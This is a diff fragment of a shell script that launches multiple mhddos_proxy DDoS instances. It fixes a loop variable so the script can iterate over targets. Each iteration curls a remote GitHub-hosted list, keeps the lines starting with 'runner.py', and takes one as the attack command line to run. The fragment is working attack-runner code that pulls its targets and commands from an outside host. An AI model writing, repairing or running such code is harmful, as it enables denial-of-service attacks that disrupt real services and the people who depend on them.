@@ -56,7 +56,7 @@ do
    
       
    # Launch multiple mhddos_proxy instances with different targets.
-   for i in list_size
+   for i in $list_size
    do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
